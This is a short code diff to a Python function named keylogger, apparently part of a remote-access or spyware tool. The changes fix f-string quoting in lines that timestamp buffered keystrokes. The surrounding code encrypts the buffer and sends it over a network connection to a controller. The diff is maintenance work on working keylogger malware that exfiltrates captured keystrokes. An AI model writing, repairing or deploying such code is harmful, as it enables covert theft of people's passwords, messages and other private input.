@@ -43,7 +43,7 @@ def keylogger(keys: int,BUFFER_SIZE):
         nonlocal i
         if i>=keys:
             if buffer:
-                data = f'{datetime.now().strftime('%H:%M:%S')} - {"".join(buffer)}'
+                data = f'{datetime.now().strftime("%H:%M:%S")} - {"".join(buffer)}'
                 connection.send(Encrypt(data.encode()))
             connection.send(Encrypt(b'Done'))
             return False      
@@ -64,7 +64,7 @@ def keylogger(keys: int,BUFFER_SIZE):
         buffer.append(key_data)
         i+=1
         if len(buffer)>= BUFFER_SIZE:
-            data = f'{datetime.now().strftime('%H:%M:%S')} - {"".join(buffer)}'
+            data = f"{datetime.now().strftime('%H:%M:%S')} - {''.join(buffer)}"
             connection.send(Encrypt(data.encode()))
             buffer.clear()
 
